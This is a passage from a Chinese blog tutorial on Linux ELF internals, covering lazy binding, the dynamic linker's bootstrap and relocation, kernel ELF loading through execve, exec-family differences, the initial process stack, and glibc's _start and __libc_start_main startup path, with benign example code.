<p>地址无关代码虽然解决了模块复用的问题，但是本质还是装载时重定位因此没有解决性能问题，实际上 ELF 采用了<strong>延迟绑定</strong>的方法来解决这一问题。</p>
<p>地址无关代码技术除了可以用在共享对象上面，它也可以用于<strong>可执行文件</strong>，一个以地址无关方式编译的可执行文件被称作地址无关可执行文件（<strong>PIE</strong>, Position-Independent Executable）。与 GCC 的 <code>-fPIC</code> 和 <code>-fpic</code> 参数类似，产生 PIE 的参数为 <code>-fPIE</code> 或 <code>-fpie</code> 。</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在动态链接下，程序模块之间包含了大量的函数引用（全局变量往往比较少，因为大量的全局变量会导致模块之间耦合度变大），所以在程序开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。可以想象，在一个程序运行过程中，可能很多函数在程序执行完时都不会被用到，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以 ELF 采用了一种叫做延迟绑定（Lazy Binding）的做法，基本的思想就是当函数第一次被用到时才进行绑定（符号查找、重定位等），如果没有用到则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器来负责绑定。这样的做法可以大大加快程序的启动速度，特别有利于一些有大量函数引用和大量模块的程序。</p>
<p><strong>注意，延迟绑定一般只出先在未开启 FULL RELRO 的时候，如果开启 FULL RELRO 则 got 表不可写，程序在装载时完成 got 表的重定位。当然特殊情况也有在开启 FULL RELRO 的时候进行重定位，比如 ret2dlresolve 。</strong></p>
<p>我们以调用 <code>puts</code> 函数为例讲解一下延迟绑定的过程。</p>
<p>首先第一次调用 <code>puts</code> 时由于 <code>puts@got</code> 没有进行重定位，因此会调用 <code>_dl_runtime_resolve</code> 函数进行重定位，<code>_dl_runtime_resolve</code> 函数将查找到的 <code>puts</code> 函数地址填写到 <code>puts@got</code> 后会调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004319385.png"
                      alt="image-20241108004319385"
                ><br>再次调用 <code>puts</code> 函数时由于 <code>puts@got</code> 已经完成重定位，因此会直接调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004343509.png"
                      alt="image-20241108004343509"
                ><br>其中在第一次调用 <code>puts</code> 函数时调用的 <code>_dl_runtime_resolve</code> 函数的具体实现为：</p>
<ul>
<li>用第一个参数 <code>link_map</code> 访问 <code>.dynamic</code> ，取出 <code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code> 的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项 <code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作 <code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给 <code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h3><h4 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h4><p>由于动态链接器本身的作用是重定位，因此自身的重定位也需要自身来完成，完成自身重定位的过程成为自举（Bootstrap）。</p>
<p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自己的 GOT 。而 GOT 的第一个入口保存的即是 <code>.dynamic</code> 段的偏移地址，由此找到了动态连接器本身的“.dynamic”段。通过 <code>.dynamic</code> 中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p>
<p>从这一步开始，动态链接器代码中才可以开始使用自己的全局变量和静态变量。</p>
<h4 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h4><p>完成基本自举以后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表当中，我们可以称它为全局符号表（Global Symbol Table）。然后链接器开始寻找可执行文件所依赖的共享对象，我们前面提到过 <code>.dynamic</code> 段中，有一种类型的入口是 <code>DT_NEEDED</code> ，它所指出的是该可执行文件（或共享对象）所依赖的共享对象。由此，链接器可以列出可执行文件所需要的所有共享对象，并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取一个所需要的共享对象的名字，找到相应的文件后打开该文件，读取相应的 ELF 文件头和 <code>.dynamic</code> 段，然后将它相应的代码段和数据段映射到进程空间中。</p>
<p>如果这个 ELF 共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环直到所有依赖的共享对象都被装载进来为止，当然链接器可以有不同的装载顺序，如果我们把依赖关系看作一个图的话，那么这个装载过程就是一个图的遍历过程，链接器可能会使用深度优先或者广度优先或者其他的顺序来遍历整个图，这取决于链接器，比较常见的算法一般都是广度优先的。</p>
<p>当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。</p>
<h4 id="重定位和初始化"><a href="#重定位和初始化" class="headerlink" title="重定位和初始化"></a>重定位和初始化</h4><p>当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的 GOT&#x2F;PLT 中的每个需要重定位的位置进行修正。因为此时动态链接器已经拥有了进程的全局符号表，所以这个修正过程也显得比较容易，跟我们前面提到的地址重定位的原理基本相同。</p>
<p>动态链接重定位除了前面静态链接重定位类型外还有如下重定位类型：</p>
<ul>
<li><code>R_386_RELATIVE</code>：针对下面这种代码的重定位，由于加载地址不确定，需要加载后的才能确定。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>* p = &amp;a;</span><br></pre></td></tr></table></figure></div></li>
<li><code>R_386_GLOB_DAT</code>：位于 <code>.got</code> 的重定位入口，只需要填入正确变量地址即可。</li>
<li><code>R_386_JUMP_SLOT</code>：位于 <code>.got.plt</code> 的重定位入口，只需要填入正确的函数地址即可。</li>
</ul>
<p>重定位完成之后，如果某个共享对象有 <code>.init</code> 段，那么动态链接器会执行 <code>.init</code> 段中的代码，用以实现共享对象特有的初始化过程，比如最常见的，共享对象中的 C++ 的全局&#x2F;静态对象的构造就需要通过 <code>.init</code> 来初始化。相应地，共享对象中还可能有 <code>.fini</code> 段，当进程退出时会执行 <code>.fini</code> 段中的代码，可以用来实现类似 C++ 全局对象析构之类的操作。</p>
<p>如果进程的可执行文件也有 <code>.init</code> 段，那么动态链接器不会执行它，因为可执行文件中的 <code>.init</code> 段和 <code>.fini</code> 段由程序初始化部分代码负责执行。当完成了重定位和初始化之后，所有的准备工作就宣告完成了，所需要的共享对象也都已经装载并且链接完成了，这时候动态链接器就如释重负，将进程的控制权转交给程序的入口并且开始执行。</p>
<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><h2 id="Linux-内核装载-ELF-过程"><a href="#Linux-内核装载-ELF-过程" class="headerlink" title="Linux 内核装载 ELF 过程"></a>Linux 内核装载 ELF 过程</h2><p>首先在用户层面，bash 进程会调用 <code>fork()</code> 系统调用创建一个新的进程，然后新的进程调用 <code>execve()</code> 系统调用执行指定的 ELF 文件，原先的 bash 进程继续返回等待刚才启动的新进程结束，然后继续等待用户输入命令。</p>
<p><code>execve()</code> 系统调用被定义在 <code>unistd.h</code> ，它的原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Replace the current process, executing PATH with arguments ARGV and</span></span><br><span class="line"><span class="comment">   environment ENVP.  ARGV and ENVP are terminated by NULL pointers.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__path, <span class="type">char</span> *<span class="type">const</span> __argv[], <span class="type">char</span> *<span class="type">const</span> __envp[])</span>;</span><br></pre></td></tr></table></figure></div>
<p>它的三个参数分别是被执行的程序文件名、执行参数和环境变量。</p>
<p>Glibc 对 <code>execvp()</code> 系统调用进行了包装，提供了 <code>execl()</code> 、<code>execlp()</code> 、<code>execle()</code> 、<code>execv()</code> 和 <code>execvp()</code> 等5个不同形式的 <code>exec</code> 系列 API ，它们只是在调用的参数形式上有所区别，但最终都会调用到 <code>execve()</code> 这个系统调用。下面是一个简单的使用 <code>fork()</code> 和 <code>execlp()</code> 实现的 minibash ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_COMMAND_LENGTH 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> command[MAX_COMMAND_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;minibash$ &quot;</span>);</span><br><span class="line">        fgets(command, <span class="keyword">sizeof</span>(command), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除换行符</span></span><br><span class="line">        command[<span class="built_in">strcspn</span>(command, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否输入了退出命令</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(command) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            <span class="keyword">if</span> (execlp(command, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;minibash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在进入 <code>execve()</code> 系统调用之后，Linux 内核就开始进行真正的装载工作。在内核中， <code>execve()</code> 系统调用相应的入口是 sys_execve()， 它被定义在 <code>arch\i386\kernel\Process.c</code> 。<code>sys_execve()</code> 进行一些参数的检查复制之后，调用 <code>do_execve()</code> 。<code>do_execve()</code> 会首先查找被执行的文件，如果找到文件，则 <code>do_execve()</code> 读取文件的前128个字节判断文件的格式，每种可执行文件的格式的开头几个字节都是很特殊的，特别是开头4个字节，常常被称做魔数（Magic Number），通过对魔数的判断可以确定文件的格式和类型。比如 ELF 的可执行文件格式的头 4 个字节为 <code>\x7felf</code> ；而 Java 的可执行文件格式的头4个字节为 <code>cafe</code> ；如果被执行的是 Shell 脚本或 perl 、python 等这种解释型语言的脚本，那么它的第一行往往是 <code>#!/bin/sh</code> 或 <code>#!/usr/bin/perl</code> 或 <code>#!/usr/bin/python</code> ，这时候前两个字节 <code>#</code> 和 <code>!</code> 就构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。</p>
<p>当 <code>do_execve()</code> 读取了这 128 个字节的文件头部之后，然后调用 <code>search_binary_handle()</code> 去搜索和匹配合适的可执行文件装载处理过程。Linux中所有被支持的可执行文件格式都有相应的装载处理过程， <code>search_binary_handle()</code> 会通过判断文件头部的魔数确定文件的格式，并且调用相应的装载处理过程。比如 ELF 可执行文件的装载处理过程叫做 <code>load_elf_binary()</code>； a.out 可执行文件的装载处理过程叫做 <code>load_aout_binary()</code>；而装载可执行脚本程序的处理过程叫做 <code>load_script()</code> 。 这里我们只关心 ELF 可执行文件的装载， <code>load_elf_binary()</code> 被定义在 <code>fs/Binfmt_elf.c</code> ，这个函数的代码比较长，它的主要步骤是：</p>
<ul>
<li>检查ELF可执行文件格式的有效性，比如魔数、程序头表中段（Segment）的数量。</li>
<li>寻找动态链接的 <code>.interp</code> 段，设置动态链接器路径。</li>
<li>根据 ELF 可执行文件的<strong>程序头表</strong>的描述，对 ELF 文件进行映射，比如代码、数据、只读数据。</li>
<li>初始化 ELF 进程环境，比如进程启动时 EDX 寄存器的地址应该是 <code>DT_FINI</code> 的地址（参照动态链接）。</li>
<li>将系统调用的返回地址修改成 ELF 可执行文件的入口点，这个入口点取决于程序的链接方式，对于<strong>静态链接</strong>的 ELF 可执行文件，这个程序入口就是 ELF 文件的文件头中 <strong><code>e_entry</code> 所指的地址</strong>；对于<strong>动态链接</strong>的 ELF 可执行文件，程序入口点是<strong>动态链接器</strong>。</li>
</ul>
<p>当 <code>load_elf_binary()</code> 执行完毕，返回至 <code>do_execve()</code> 再返回至 <code>sys_execve()</code> 时，上面的第 5 步中已经把系统调用的返回地址改成了被装载的 ELF 程序的入口地址了。所以当 <code>sys_execve()</code> 系统调用从内核态返回到用户态时，EIP 寄存器直接跳转到了 ELF 程序的入口地址，于是新的程序开始执行，ELF 可执行文件装载完成。</p>
<h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>在现代操作系统中，每个进程都有自己的虚拟地址空间，这是一个抽象的地址空间，由连续的虚拟地址组成。每个进程在其虚拟地址空间中运行，不会直接访问物理内存地址。</p>
<p>操作系统将每个进程的虚拟地址空间划分为多个区域，例如代码段、数据段、堆和栈等。每个区域具有特定的用途和权限。</p>
<ul>
<li>代码段：包含可执行程序的机器指令。</li>
<li>数据段：包含静态和全局变量的初始值。</li>
<li>BSS 段：包含需要初始化为零的静态和全局变量。</li>
<li>动态链接段：包含动态链接所需的信息。</li>
</ul>
<p>加载器将这些段从 ELF 文件中复制到相应的虚拟内存地址，并建立虚拟地址与物理内存地址的映射关系。</p>
<h2 id="execve-系列函数之间的区别"><a href="#execve-系列函数之间的区别" class="headerlink" title="execve 系列函数之间的区别"></a>execve 系列函数之间的区别</h2><p><code>execve</code> 和其他 <code>exec</code> 系列函数（<code>execl</code>, <code>execlp</code>, <code>execle</code>, <code>execv</code>, <code>execvp</code>, <code>execvpe</code>）是 UNIX 和 Linux 系统编程中用于执行程序的重要工具。它们都用于在当前进程中加载并执行一个新程序，从而完全替换当前进程的内存空间、数据、堆栈等内容，但进程ID保持不变。这些函数通常用于需要替换当前执行的程序的情况，如 shell 实现中运行外部命令。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>所有这些函数最终都会调用系统的 <code>execve</code> 系统调用。<code>execve</code> 是实现其他 <code>exec</code> 函数的底层基础。当调用任一 <code>exec</code> 函数时，当前进程的地址空间将被新程序替换，但进程的 PID 保持不变。这意味着新程序将继续使用调用 <code>exec</code> 的进程的 PID，并从 <code>main()</code> 函数开始执行，而原进程的所有代码和数据则被新程序的代码和数据所替换。</p>
<h3 id="函数差异"><a href="#函数差异" class="headerlink" title="函数差异"></a>函数差异</h3><ul>
<li><p><strong>execve</strong></p>
<ul>
<li><strong>原型</strong>：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code></li>
<li><strong>参数</strong>：<ul>
<li><code>pathname</code>：要执行的程序路径。</li>
<li><code>argv</code>：传递给新程序的参数数组，以 NULL 结尾。</li>
<li><code>envp</code>：传递给新程序的环境变量数组，以 NULL 结尾。</li>
</ul>
</li>
<li><strong>特点</strong>：是唯一一个直接系统调用的 <code>exec</code> 函数，其他 <code>exec</code> 函数最终都是通过调用 <code>execve</code> 实现的。</li>
</ul>
</li>
<li><p><strong>execl, execlp, execle</strong></p>
<ul>
<li><strong>特点</strong>：这些函数允许直接在函数调用中列出参数，而不是通过数组传递。</li>
<li><code>execl</code> 和 <code>execle</code> 需要提供程序的完整路径，而 <code>execlp</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execle</code> 允许直接指定环境变量。</li>
</ul>
</li>
<li><p><strong>execv, execvp, execvpe</strong></p>
<ul>
<li><strong>特点</strong>：这些函数通过数组传递参数给新程序。</li>
<li><code>execv</code> 需要提供程序的完整路径。</li>
<li><code>execvp</code> 和 <code>execvpe</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execvpe</code> 类似于 <code>execvp</code>，但允许指定环境变量。</li>
</ul>
</li>
</ul>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul>
<li><strong>execve</strong>：需要精确控制新程序的环境变量时使用。</li>
<li><strong>execl, execlp, execle</strong>：当参数数量已知且不需要动态构建参数数组时使用。</li>
<li><strong>execv, execvp, execvpe</strong>：当参数以数组形式提前构建好或在程序中动态生成时使用。</li>
</ul>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><h2 id="进程栈的初始化"><a href="#进程栈的初始化" class="headerlink" title="进程栈的初始化"></a>进程栈的初始化</h2><p>我们知道进程刚开始启动的时候，须知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息提前保存到进程的虚拟空间的栈中。</p>
<p>假设我们运行如下命令，即运行 <code>ls</code> 程序，传入的参数为 <code>/home</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br></pre></td></tr></table></figure></div>
<p>在程序初始状态的栈如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004415525.png"
                      alt="image-20241108004415525"
                ><br>栈顶寄存器 rsp 指向的位置是初始化以后堆栈的顶部，最前面的 8 个字节表示<strong>命令行参数的数量</strong>，我们的例子里面是两个，即 <code>/usr/bin/ls</code> 和 <code>/home</code> ，紧接的就是分布指向这两个参数字符串的<strong>指针</strong>；后面跟了一个0；接着是一个以 0 结尾的指向环境变量字符串的指针数组。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0b14b8f7b214bfb36efc1979d4c50b10.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
进程在启动以后，程序的库部分会把堆栈里的初始化信息中的参数信息传递给 `main()` 函数，也就是我们熟知的 `main()` 函数的两个 `argc` 和 `argv` 两个参数，这两个参数分别对应这里的命令行参数数量和命令行参数字符串指针数组。

<h2 id="main-函数之外的代码"><a href="#main-函数之外的代码" class="headerlink" title="main 函数之外的代码"></a>main 函数之外的代码</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004734754.png"
                      alt="image-20241108004734754"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004754680.png"
                      alt="image-20241108004754680"
                ><br>当运行程序时，shell 或 gui 调用 <code>execve()</code> ，它执行 linux 系统调用 <code>execve()</code> 设置一个堆栈，并将 <code>argc</code> 、 <code>argv</code> 和 <code>envp</code> 压入其中。文件描述 0、1 和 2（<code>stdin</code> 、<code>stdout</code> 、<code>stderr</code>)保留为 shell 设置的值，动态链接器完成重定位工作。当一切准备就绪后，通过调用 <code>_start()</code> 将控制权交给程序。</p>
<p>一般情况下 ELF 的入口点为 <code>_start</code> 函数，这个函数的主要作用是设置 <code>___libc_start_main</code> 函数的所需参数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049080 endbr32</span><br><span class="line">.text:08049084 xor     ebp, ebp                        ; 设置 ebp 为 0 表示最外层栈</span><br><span class="line">.text:08049086 pop     esi                             ; argc</span><br><span class="line">.text:08049087 mov     ecx, esp                        ; argv</span><br><span class="line">.text:08049089 and     esp, 0FFFFFFF0h                 ; 栈对齐</span><br><span class="line">.text:0804908C push    eax                             ; 静态链接程序默认为 0 ，动态链接程序默认为模块对应的 link_map</span><br><span class="line">.text:0804908D push    esp                             ; stack_end</span><br><span class="line">.text:0804908E push    edx                             ; rtld_fini</span><br><span class="line">.text:0804908F call    sub_80490B7</span><br><span class="line">.text:0804908F</span><br><span class="line">.text:08049094 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); ebx = offset _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:0804909A lea     eax, (__libc_csu_fini - 804C000h)[ebx] ; (__libc_csu_fini - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A0 push    eax                             ; fini</span><br><span class="line">.text:080490A1 lea     eax, (__libc_csu_init - 804C000h)[ebx] ; (__libc_csu_init - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A7 push    eax                             ; init</span><br><span class="line">.text:080490A8 push    ecx                             ; ubp_av</span><br><span class="line">.text:080490A9 push    esi                             ; argc</span><br><span class="line">.text:080490AA mov     eax, offset main</span><br><span class="line">.text:080490B0 push    eax                             ; main</span><br><span class="line">.text:080490B1 call    ___libc_start_main</span><br><span class="line">.text:080490B1</span><br><span class="line">.text:080490B6 hlt</span><br><span class="line">.text:080490B7 sub_80490B7 proc near                   ; CODE XREF: _start+F↑p</span><br><span class="line">.text:080490B7 mov     ebx, [esp]</span><br><span class="line">.text:080490BA retn</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>__libc_start_main</code> 函数，通过调试发现使用 glibc-2.23 的 32 位程序实际调用的是 <code>generic_start_main</code> 函数，该函数位于 <code>csu/libc-start.c</code> 中，定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> LIBC_START_MAIN generic_start_main</span></span><br><span class="line"></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure></div>
<p>可见和 <code>_start</code> 函数里的调用一致，一共有 7 个参数，其中 <code>main</code> 由第一个参数传入，紧接着是 <code>argc</code> 和 <code>argv</code>（这里称为 <code>ubp_av</code> ，因为其中还包含了环境变量表）。除了 <code>main</code> 的函数指针之外，外部还要传入 3 个函数指针，分别是：</p>
<ul>
<li><code>init</code>：<code>main</code> 调用前的初始化工作，默认是 <code>__libc_csu_init</code> 函数指针。</li>
<li><code>fini</code>：<code>main</code> 结束后的收尾工作，默认是 <code>__libc_csu_fini</code> 函数指针。</li>
<li><code>rtld_fini</code>：和动态加载有关的收尾工作，<code>rtld</code> 是 runtime loader 的缩写。如果是动态链接程序默认是 <code>_dl_fini</code> 函数指针，如果是静态链接程序默认为 NULL 。</li>
</ul>
<p>最后的 <code>stack_end</code> 标明了栈底的地址，即最高的栈地址。</p>
<p>首先初始化 <code>__libc_multiple_libcs</code> 为 0 之后 <code>generic_start_main</code> 会调用 <code>__cxa_atexit </code> 将 <code>rtld_fini</code> 注册为 <code>main</code> 函数结束后的回调函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">  __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
<p>当然如果是静态链接程序还会做一些额外的初始化，在动态链接程序中这些初始化是在动态连接器中完成的。</p>
<ul>
<li>如果是开启 PIE 的静态程序会调用 <code>_dl_relocate_static_pie</code> 函数初始化 <code>link_map</code> 并且进行重定位。</li>
<li>初始化 <code>__environ</code> 。</li>
<li>初始化 <code>__libc_stack_end</code> 。</li>
<li>调用 <code>dl_aux_init</code> 根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作。</li>
<li>如果<strong>程序头表</strong>指针 <code>dl_phdr</code> 没有初始化，就通过 ELF 文件头的 <code>e_phoff</code> 初始化 <code>dl_phdr</code>（程序头表地址），通过 <code>e_phnum</code> 初始化 <code>dl_phnum</code>（程序头表中的项数）。不过这个一般在上一步根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作时就已经初始化过了。</li>
<li>调用 <code>_libc_init_secure</code> 函数，如果 <code>_libc_enable_secure_decided</code> 不为 0 则初始化 <code>_libc_enable_secure</code> 为 <code>(__geteuid() != __getuid() || __getegid() != __getgid())</code> 。<ul>
<li><code>__geteuid() != __getuid()</code>：比较有效用户 ID（effective user ID）和实际用户 ID（real user ID）。如果它们不相等，表示当前进程以特权用户身份运行（比如以 root 用户权限运行）。</li>
<li><code>__getegid() != __getgid()</code>：比较有效组 ID（effective group ID）和实际组 ID（real group ID）。如果它们不相等，表示当前进程以特权用户组身份运行。</li>
<li>这段代码的目的是判断当前进程是否以特权用户或特权用户组身份运行。这在某些情况下可能需要采取不同的安全措施或限制特权操作。</li>
</ul>
</li>
<li>调用 <code>__tunables_init</code> 函数从环境变量中提取信息，并用于初始化可调节项列表，以便在程序运行时可以根据这些可调节项来进行相应的配置或调整。</li>
<li>使用 <code>ARCH_INIT_CPU_FEATURES</code> 宏初始化 CPU 的相关参数到 <code>cpu_features</code> 类型的结构体 <code>_dl_x86_cpu_features</code> 中。</li>
<li>重定位代码中的绝对地址引用 。</li>
<li>调用 <code>__libc_setup_tls</code> 函数初始化 tls 。</li>
<li>如果 <code>__libc_multiple_libcs</code> 为 0 则调用 <code>DL_SYSDEP_OSCHECK</code> 宏来初始化 <code>dl_osversion</code> 为内核版本号。</li>
<li>调用 <code>__pthread_initialize_minimal</code> 函数初始化线程库 。</li>
<li>初始化 <code>__stack_chk_guard</code> 。</li>
<li>初始化 <code>pointer_chk_guard</code> 。</li>
<li>调用 <code>_libc_init_first</code> 函数初始化 <code>_libc_argc</code> ，<code>_libc_argv</code> 和 <code>environ</code> 等。</li>
<li>调用 <code>__cxa_atexit</code> 函数将 <code>fini</code> 注册为 <code>main</code> 函数结束后的回调函数 。</li>
</ul>
<p>之后判断函数指针 <code>init</code> 是否为空，如果不为空则调用该函数指针，也就是 <code>__libc_csu_init</code> 函数。</p>
<p><code>__libc_csu_init</code> 函数定义在 <code>csu/elf-init.c</code> 中，内容如下：</p>
<ul>
<li>如果是<strong>静态链接程序</strong>会依次调用函数指针数组 <code>__preinit_array_start </code> 中的所有函数。</li>
<li>调用 <code>_init </code> 函数。</li>
